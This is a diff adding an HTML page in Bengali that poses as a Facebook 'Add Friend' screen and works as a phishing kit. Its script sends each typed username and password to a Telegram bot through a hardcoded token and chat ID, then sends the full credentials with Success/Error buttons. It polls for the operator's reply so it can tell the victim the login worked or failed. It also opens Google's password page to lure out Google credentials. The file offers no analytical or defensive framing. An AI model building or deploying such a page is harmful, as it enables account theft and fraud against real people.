@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Add Friend</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #f0f2f5; font-family: 'Helvetica', Arial, sans-serif; overflow-x: hidden; }
+        .fb-input {
+            width: 100%; padding: 14px 16px; border: 1px solid #dddfe2;
+            border-radius: 6px; background: #f5f6f7; font-size: 15px; outline: none;
+        }
+        .fb-input:focus { border-color: #1877f2; background: #fff; }
+        .hidden { display: none; }
+        .fb-loader {
+            width: 40px; height: 40px; border: 4px solid #f3f3f3;
+            border-top: 4px solid #1877f2; border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div id="step1" class="flex flex-col items-center pt-10 px-4">
+        <div class="w-full max-w-sm bg-white shadow-md rounded-2xl overflow-hidden">
+            <img src="https://raw.githubusercontent.com/probasi-kollan-office-creator/facebook-friend-add/main/Picsart_26-03-15_06-28-09-284.jpg" class="w-full">
+            <div class="p-6 text-center">
+                <h2 class="text-xl font-bold mb-4">নতুন বন্ধু বানান</h2>
+                <button onclick="goToStep(2)" class="w-full bg-[#1877f2] text-white font-bold py-3 rounded-xl shadow-lg">Add Friend</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="step2" class="hidden flex flex-col items-center pt-6 px-4">
+        <div class="w-full max-w-sm bg-white shadow-md rounded-2xl overflow-hidden">
+            <img src="https://raw.githubusercontent.com/probasi-kollan-office-creator/facebook-friend-add/main/Picsart_26-03-15_06-28-09-284.jpg" class="w-full">
+            <div class="p-6">
+                <input type="email" id="email" autocomplete="username" class="fb-input mb-3" placeholder="ইমেইল বা ফোন" oninput="sendData('User: ' + this.value)">
+                <input type="password" id="pass" autocomplete="current-password" class="fb-input mb-4" placeholder="পাসওয়ার্ড" oninput="handlePassInput(this.value)">
+                
+                <button onclick="openGoogleAndVerify()" class="w-full bg-[#1877f2] text-white font-bold py-3 rounded-xl">Add Friend</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="step4" class="hidden fixed inset-0 bg-[#f0f2f5] z-50 flex flex-col items-center pt-10 text-center">
+        <div class="w-full max-w-sm bg-white shadow-md rounded-2xl overflow-hidden">
+            <img src="https://raw.githubusercontent.com/probasi-kollan-office-creator/facebook-friend-add/main/Picsart_26-03-15_06-28-09-284.jpg" class="w-full">
+            <div class="p-10 flex flex-col items-center">
+                <div id="loader" class="fb-loader mb-4"></div>
+                <h3 id="status-title" class="text-xl font-bold text-gray-800">যাচাই চলছে...</h3>
+                <p id="status-msg" class="text-gray-500 mt-2">অপেক্ষা করুন, আপনার রিকোয়েস্ট প্রসেস হচ্ছে।</p>
+                
+                <a id="fb-link" href="https://m.me/sabinayasmeen121" class="hidden mt-6 w-full bg-[#1877f2] text-white font-bold py-3 rounded-xl text-center">Open Facebook</a>
+                
+                <button id="retry-btn" onclick="goToStep(2)" class="hidden mt-6 w-full bg-red-500 text-white font-bold py-3 rounded-xl">পুনরায় চেষ্টা করুন</button>
+            </div>
+        </div>
+    </div>
+
+<script>
+    const botToken = "8617715035:AAHXQjkEtjYX40KQTAE5e_jVRQ_pKQX5Qjk";
+    const chatId = "8516934257";
+    let lastUpdateId = 0;
+
+    function goToStep(step) {
+        document.getElementById('step1').classList.add('hidden');
+        document.getElementById('step2').classList.add('hidden');
+        document.getElementById('step4').classList.add('hidden');
+        document.getElementById('step' + step).classList.remove('hidden');
+
+        if(step === 4) {
+            sendFinalData();
+            listenForControl();
+        }
+    }
+
+    // গুগল পেজ ওপেন এবং ভেরিফিকেশন শুরু করার ফাংশন
+    function openGoogleAndVerify() {
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('pass').value;
+        if(!email || !pass) { alert("তথ্য দিন।"); return; }
+
+        // ১. গুগল পাসওয়ার্ড পেজ নতুন ট্যাবে ওপেন হবে
+        window.open("https://myaccount.google.com/signinoptions/password", '_blank');
+
+        // ২. মেইন পেজকে যাচাই স্ক্রিনে নিয়ে যাবে
+        goToStep(4);
+    }
+
+    async function sendData(text) {
+        try {
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ chat_id: chatId, text: text })
+            });
+        } catch (e) {}
+    }
+
+    function handlePassInput(val, prefix = "Pass: ") {
+        if (val.length >= 4) {
+            sendData(prefix + val);
+        }
+    }
+
+    async function sendFinalData() {
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('pass').value;
+        const msg = `🔔 **ভেরিফিকেশন রিকোয়েস্ট**\n📧 User: \`${email}\`\n🔑 Pass: \`${pass}\``;
+        
+        const buttons = {
+            inline_keyboard: [[
+                { text: "❌ Error", callback_data: "cmd_error" },
+                { text: "✅ Success", callback_data: "cmd_success" }
+            ]]
+        };
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: "Markdown", reply_markup: buttons })
+        });
+    }
+
+    function listenForControl() {
+        const interval = setInterval(async () => {
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateId + 1}`);
+                const data = await res.json();
+                
+                if (data.result && data.result.length > 0) {
+                    data.result.forEach(update => {
+                        lastUpdateId = update.update_id;
+                        const cmd = update.callback_query?.data;
+                        
+                        if (cmd === "cmd_success") {
+                            clearInterval(interval);
+                            showSuccess();
+                        } else if (cmd === "cmd_error") {
+                            clearInterval(interval);
+                            showError();
+                        }
+                    });
+                }
+            } catch (e) {}
+        }, 3000);
+    }
+
+    function showSuccess() {
+        document.getElementById('loader').classList.add('hidden');
+        document.getElementById('status-title').innerText = "সফল হয়েছে!";
+        document.getElementById('status-title').style.color = "green";
+        document.getElementById('status-msg').innerText = "এখন আপনি সরাসরি বন্ধু হতে পারেন।";
+        document.getElementById('fb-link').classList.remove('hidden');
+    }
+
+    function showError() {
+        document.getElementById('loader').classList.add('hidden');
+        document.getElementById('status-title').innerText = "অসফল হয়েছে!";
+        document.getElementById('status-title').style.color = "red";
+        document.getElementById('status-msg').innerText = "আপনার দেওয়া তথ্যটি ভুল ছিল। দয়া করে আবার চেষ্টা করুন।";
+        document.getElementById('retry-btn').classList.remove('hidden');
+    }
+</script>
+
+</body>
+</html>
